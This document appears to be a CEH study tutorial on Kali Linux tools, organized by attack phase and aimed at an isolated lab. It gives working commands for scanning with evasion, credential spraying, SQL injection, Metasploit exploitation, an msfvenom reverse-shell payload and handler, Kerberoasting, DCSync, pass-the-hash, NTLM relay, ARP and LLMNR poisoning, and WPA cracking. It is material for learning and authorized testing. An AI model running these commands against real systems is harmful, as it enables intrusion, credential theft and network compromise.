# Kali Linux for CEH — Deep Tool Tutorial

> A hands-on guide to the tools CEH tests, organized by **phase**, with real command syntax you run against **your own [lab](labs/)** (Kali `192.168.56.10` · Metasploitable2 `192.168.56.20` · DC/ADCS `192.168.56.30` · Docker web on `localhost:8081–8084`). Pairs with the [cheatsheets](cheatsheets/) (quick reference) and the module [labs](modules/) (driven exercises).

> **⚖️ Authorized targets only.** Everything below is for your isolated lab or systems you have written permission to test. Kali ships *offensive* tools — pointing them at anything else is a crime.

## Contents
- [0. Setup & conventions](#0-setup--conventions)
- [1. Recon / OSINT](#1-recon--osint-module-02)
- [2. Scanning](#2-scanning-module-03)
- [3. Enumeration](#3-enumeration-module-04)
- [4. Vulnerability analysis](#4-vulnerability-analysis-module-05)
- [5. Web app hacking](#5-web-application-hacking-modules-1315)
- [6. Exploitation — Metasploit](#6-exploitation--metasploit-framework-module-06)
- [7. Password attacks](#7-password-attacks-module-06)
- [8. Active Directory / identity](#8-active-directory--identity-modules-0406)
- [9. Sniffing & MITM](#9-sniffing--mitm-module-08)
- [10. Wireless](#10-wireless-module-16)
- [11. Post-exploitation & pivoting](#11-post-exploitation--pivoting-module-06)
- [12. Workflow, notes & reporting](#12-workflow-notes--reporting)
- [Tool → module quick map](#tool--module-quick-map)

---

## 0. Setup & conventions

Kali is a Debian-based distro preloaded with the tools below. Keep it current and know a few conventions.

```bash
sudo apt update && sudo apt full-upgrade -y      # update Kali + tools
sudo apt install -y kali-linux-large             # optional: the big toolset
sudo msfdb init                                  # initialize Metasploit's database
gunzip -k /usr/share/wordlists/rockyou.txt.gz    # unpack the go-to wordlist
```

- **Run as needed with `sudo`** — raw-socket tools (nmap SYN scan, tcpdump, responder) need root.
- **Wordlists** live in `/usr/share/wordlists/` (rockyou, SecLists via `sudo apt install seclists` → `/usr/share/seclists/`).
- **Work in `tmux`** so long scans survive disconnects (see §12).
- **Set targets as variables** to keep commands clean:
  ```bash
  export DC=192.168.56.30 TARGET=192.168.56.20 DOMAIN=ceh.lab
  ```

---

## 1. Recon / OSINT (Module 02)

Passive-first: gather from third parties before touching the target.

**whois / dig** — registration and DNS.
```bash
whois example.com
dig @$DC $DOMAIN ANY +noall +answer      # records from the lab DC
dig @$DC $DOMAIN AXFR                     # zone transfer (the classic misconfig)
dig @$DC _ldap._tcp.$DOMAIN SRV +short    # locate domain controllers
```

**theHarvester** — emails/subdomains/hosts from public sources (your own domain).
```bash
theHarvester -d example.com -b bing,crtsh,duckduckgo
```

**dnsrecon / dnsenum / sublist3r / amass** — DNS + subdomain enumeration.
```bash
dnsrecon -d $DOMAIN -n $DC -a            # -a attempts AXFR
amass enum -passive -d example.com       # subdomain discovery (passive)
```

**recon-ng** — modular OSINT framework (marketplace of modules); **Maltego** — GUI link analysis; **Shodan** — index of exposed devices (`shodan search 'org:"Your Org"'` with your API key). Query the index; never connect to results you don't own.

> **How to use:** build a target map (domains, hosts, emails, tech stack, exposed services) *before* scanning — it tells you where to point active tools and shapes phishing pretexts (Module 09).

---

## 2. Scanning (Module 03)

**nmap** — the core scanner. Full flag reference in [cheatsheets/nmap.md](cheatsheets/nmap.md); the workflow:
```bash
sudo nmap -sn 192.168.56.0/24                       # 1. host discovery (who's up)
sudo nmap -sS -p- --min-rate 2000 $TARGET -oA scans/full   # 2. all TCP ports, save output
sudo nmap -sV -sC -p <open,ports> $TARGET -oA scans/svc    # 3. versions + default scripts
sudo nmap -sU --top-ports 50 $TARGET                # 4. top UDP (slow)
sudo nmap --script vuln $TARGET                     # NSE vuln scripts
```
- `-oA` saves in all formats (grepable/xml/normal) — feed the XML to Metasploit later.
- Evasion: `-f` (fragment), `-D RND:5` (decoys), `-g 53` (source port), `-T2` (slower). See [Module 12](modules/12-evading-ids-firewalls-honeypots/).

**masscan** — internet-scale speed (rate-limit it): `sudo masscan 192.168.56.0/24 -p1-65535 --rate 1000`.
**netdiscover** — ARP host discovery on a LAN. **hping3** — craft individual packets / firewall testing.

> **How to use:** discover → full port sweep → targeted version/script scan on the open ports. Never `-A` everything blindly; it's loud and slow.

---

## 3. Enumeration (Module 04)

Turn open services into names (users, shares, SPNs).

**NetExec (nxc)** — the Swiss-army AD/enumeration tool (successor to CrackMapExec):
```bash
nxc smb $DC                                   # host info, domain, signing
nxc smb $DC -u jdoe -p 'Passw0rd!' --users --groups --shares
nxc smb 192.168.56.0/24 -u jdoe -p 'Passw0rd!'   # spray creds across a subnet
```

**enum4linux-ng / smbclient / rpcclient** — SMB/NetBIOS:
```bash
enum4linux-ng -A $TARGET
smbclient -L //$TARGET -N                      # list shares (null session)
rpcclient -U "" -N $TARGET -c 'enumdomusers'   # RID-based user enum
```

**snmpwalk** (SNMP), **ldapsearch** (LDAP), **nbtscan** (NetBIOS), **ike-scan** (VPN), **smtp-user-enum** (SMTP):
```bash
snmpwalk -v2c -c public $TARGET | head
ldapsearch -x -H ldap://$DC -b "dc=ceh,dc=lab" "(objectClass=user)" sAMAccountName
smtp-user-enum -M VRFY -U users.txt -t $TARGET
```

> **How to use:** each open port from §2 has an enumeration tool. Feed the users/shares/SPNs you find straight into §7 (password attacks) and §8 (AD).

---

## 4. Vulnerability analysis (Module 05)

**nmap --script vuln** (fast, built-in) · **Nikto** (web server) · **searchsploit** (offline Exploit-DB) · **wpscan** (WordPress) · **OpenVAS/GVM** (full scanner).
```bash
nikto -h http://$TARGET
searchsploit vsftpd 2.3.4                       # find a public exploit
searchsploit -m 17491                            # copy an exploit locally
wpscan --url http://target/ --enumerate u,vp     # users + vulnerable plugins
sudo gvm-start                                    # OpenVAS web UI at https://localhost:9392
```

> **How to use:** map versions (from §2/§3) to CVEs with searchsploit/GVM, then prioritize by exposure + exploit availability (not raw CVSS). Confirm before you fire.

---

## 5. Web application hacking (Modules 13–15)

**Burp Suite** — the intercepting proxy you live in. Set the browser proxy to `127.0.0.1:8080`, install Burp's CA, then: **Proxy** (intercept) → **Repeater** (tamper one request) → **Intruder** (fuzz) → **Decoder/Comparer**. **OWASP ZAP** is the open-source equivalent.

**Content/parameter discovery** — **ffuf** / **gobuster**:
```bash
ffuf -u http://localhost:8081/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
gobuster dir -u http://localhost:8081 -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

**whatweb** (fingerprint), **sqlmap** (SQLi), **commix** (command injection):
```bash
whatweb http://localhost:8081
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
       --cookie="PHPSESSID=<yours>; security=low" --batch --dbs
```

> **How to use:** proxy the app through Burp, map every input, then tamper by hand in Repeater; reach for sqlmap/ffuf to *automate* what you proved manually. Full drills: [Module 14](modules/14-hacking-web-applications/) & [15](modules/15-sql-injection/).

---

## 6. Exploitation — Metasploit Framework (Module 06)

The all-in-one exploitation platform. Deep cheatsheet: [cheatsheets/metasploit.md](cheatsheets/metasploit.md).

```bash
msfconsole -q
# inside msfconsole:
db_status                              # confirm the DB is connected
workspace -a ceh                       # a workspace per engagement
db_nmap -sV 192.168.56.20              # scan + store results in the DB
search vsftpd 2.3.4                    # find a matching module
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.20
show options ; check ; run             # verify then exploit
sessions -l                            # list shells; sessions -i 1 to interact
```

**msfvenom** — generate standalone payloads (benign lab use):
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o payload.exe
# catch it:
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; \
  set LHOST 192.168.56.10; set LPORT 4444; run"
```

**Meterpreter** (post-ex shell): `getuid`, `sysinfo`, `hashdump`, `getsystem` (privesc), `migrate <pid>`, `load kiwi` (mimikatz), `portfwd`.

> **How to use:** enumerate first, pick the *precise* module for the version you found, `check` before `run`, and prefer Meterpreter for post-ex. Don't spray exploits blindly.

---

## 7. Password attacks (Module 06)

**Online** (guessing a live service) — **hydra** / **medusa** / **nxc**:
```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -f
hydra -L users.txt -P pass.txt $TARGET http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"          # web form brute force
```

**Offline** (cracking captured hashes) — **hashcat** (GPU) / **john** (CPU):
```bash
hashcat -m 1000 ntlm.txt /usr/share/wordlists/rockyou.txt          # NTLM
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
john --format=nt ntlm.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Modes to know: `0` MD5 · `100` SHA1 · `1000` NTLM · `1800` sha512crypt · `5600` NetNTLMv2 · `13100` Kerberos TGS · `22000` WPA.

**Wordlist crafting** — **crunch** (generate), **cewl** (scrape a site into a wordlist), rules in `/usr/share/hashcat/rules/`.

> **How to use:** try a *small* targeted online spray (lockout-aware), but the real wins are **offline** — capture a hash (§8/§9) and crack it fast with rules. Details: [cheatsheets/hashcat-john.md](cheatsheets/hashcat-john.md).

---

## 8. Active Directory / identity (Modules 04–06)

The highest-value skill set. Practice on the [AD lab](labs/ansible/) and the [capstone](labs/capstone.md).

**Impacket** (prefixed `impacket-*` on Kali):
```bash
impacket-GetUserSPNs $DOMAIN/jdoe:'Passw0rd!' -dc-ip $DC -request         # Kerberoast
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC              # AS-REP roast
impacket-secretsdump $DOMAIN/administrator@$DC                            # dump hashes / DCSync
impacket-psexec $DOMAIN/administrator@$TARGET -hashes :<NThash>           # PtH shell
impacket-ntlmrelayx -t ldaps://$DC -smb2support                          # NTLM relay
```

**kerbrute** (user enum + password spray), **BloodHound** (attack-path graph), **Certipy** (ADCS), **evil-winrm** (WinRM shell), **Responder** (capture NetNTLM):
```bash
kerbrute userenum -d $DOMAIN --dc $DC users.txt
bloodhound-python -u jdoe -p 'Passw0rd!' -d $DOMAIN -ns $DC -c all        # collect for BloodHound
certipy find -u jdoe@$DOMAIN -p 'Passw0rd!' -dc-ip $DC -vulnerable -stdout # ESC1-8 audit
evil-winrm -i $TARGET -u administrator -H <NThash>                        # pass-the-hash WinRM
```

> **How to use:** collect with BloodHound → it *shows you the shortest path* to Domain Admin → walk it with Impacket/Certipy → then apply the [PAM fixes](defender-pam/identity-attack-paths.md) and confirm the path closes.

---

## 9. Sniffing & MITM (Module 08)

**Wireshark** (GUI deep analysis) / **tcpdump** (CLI capture):
```bash
sudo tcpdump -i eth0 -w cap.pcap                       # capture to file
tshark -r cap.pcap -Y 'ftp.request.command=="PASS"'    # find cleartext creds
```
Wireshark display filters to know: `http.request`, `ftp`, `telnet`, `tcp.port==445`.

**bettercap** (modern MITM) / **ettercap** — ARP poisoning:
```bash
sudo sysctl -w net.ipv4.ip_forward=1
sudo bettercap -iface eth0        # then: set arp.spoof.targets <victim>; arp.spoof on; net.sniff on
```

**Responder** — poison LLMNR/NBT-NS to capture NetNTLMv2 → crack with `hashcat -m 5600`:
```bash
sudo responder -I eth0 -wv
```

> **How to use:** sniff to prove cleartext leaks and to capture hashes (Responder → §7). Encryption + switch hardening kill these; that's the lesson. Full drill: [Module 08](modules/08-sniffing/).

---

## 10. Wireless (Module 16)

Needs a **monitor-mode-capable adapter**; target **only your own AP**.

**aircrack-ng suite**:
```bash
sudo airmon-ng start wlan0                               # enable monitor mode (wlan0mon)
sudo airodump-ng wlan0mon                                # scan APs/clients
sudo airodump-ng -c <ch> --bssid <AP> -w cap wlan0mon    # target one AP, capture handshake
sudo aireplay-ng --deauth 5 -a <AP> wlan0mon             # force a client to reconnect
aircrack-ng -w /usr/share/wordlists/rockyou.txt cap*.cap # crack the PSK
hashcat -m 22000 cap.hc22000 /usr/share/wordlists/rockyou.txt   # or crack with hashcat
```
**wifite** automates the above; **reaver** attacks WPS PINs.

> **How to use:** capture the 4-way handshake (deauth to speed it up), then crack offline. WPA3/SAE removes the offline-crack path. Details: [Module 16](modules/16-hacking-wireless-networks/).

---

## 11. Post-exploitation & pivoting (Module 06)

Once you have a foothold:
- **Privilege escalation scanners:** `linpeas.sh` / `winpeas.exe` (from PEASS-ng), `sudo -l`, `find / -perm -4000` (Linux SUID).
- **Meterpreter:** `getsystem`, `hashdump`, `load kiwi`, `run post/multi/recon/local_exploit_suggester`.
- **Pivoting:** route through a compromised host to reach a hidden subnet.
  ```bash
  # Metasploit autoroute:
  run autoroute -s 10.10.10.0/24
  # or proxychains + a chisel/ssh tunnel:
  proxychains nmap -sT -Pn 10.10.10.5
  ```
- **chisel** (fast reverse tunnel), **ssh -D** (dynamic SOCKS proxy), **socat**.

> **How to use:** escalate → loot creds → use them to pivot deeper. Every step maps to a Maintaining-Access technique in [Module 06](modules/06-system-hacking/).

---

## 12. Workflow, notes & reporting

- **tmux** — run long scans in detachable panes: `tmux new -s ceh`; detach `Ctrl-b d`; reattach `tmux a -t ceh`.
- **Organize output:** one dir per engagement; always `nmap -oA`, save pcaps/loot to git-ignored folders (see repo `.gitignore`).
- **Notes:** **CherryTree**, **Obsidian**, or Markdown — capture command + output + finding as you go (mirrors the module lab-log tables).
- **Reporting:** structure findings as *title → severity (CVSS) → evidence → impact → remediation* (the [vuln-analysis](modules/05-vulnerability-analysis/) framing). **Faraday**/**Dradis** for team reporting.

---

## Tool → module quick map

| Phase | Go-to Kali tools | Module |
|---|---|---|
| Recon/OSINT | whois, dig, theHarvester, recon-ng, amass, Shodan | 02 |
| Scanning | nmap, masscan, netdiscover, hping3 | 03 |
| Enumeration | nxc, enum4linux-ng, smbclient, snmpwalk, ldapsearch | 04 |
| Vuln analysis | nikto, searchsploit, wpscan, OpenVAS | 05 |
| Web | Burp, ZAP, ffuf, gobuster, sqlmap, whatweb, commix | 13–15 |
| Exploitation | Metasploit, msfvenom, searchsploit | 06 |
| Passwords | hydra, hashcat, john, crunch, cewl | 06 |
| AD/identity | impacket, BloodHound, Certipy, kerbrute, evil-winrm, Responder | 04–06 |
| Sniffing/MITM | Wireshark, tcpdump, bettercap, ettercap, Responder | 08 |
| Wireless | aircrack-ng, wifite, reaver | 16 |
| Post-ex/pivot | Meterpreter, PEASS-ng, chisel, proxychains | 06 |

> **The one habit that matters:** *enumerate thoroughly before you exploit.* Most failed attacks are failures of recon, not of tooling. Go deeper on any tool at [resources/deep-references.md](resources/deep-references.md) (HackTricks, The Hacker Recipes).

## Sources
- Kali Tools directory (official): https://www.kali.org/tools/
- Kali Docs: https://www.kali.org/docs/
- Metasploit docs: https://docs.metasploit.com/ · Impacket: https://github.com/fortra/impacket
- NetExec: https://www.netexec.wiki/ · Certipy: https://github.com/ly4k/Certipy · BloodHound: https://bloodhound.readthedocs.io/
- Hashcat modes: https://hashcat.net/wiki/doku.php?id=example_hashes
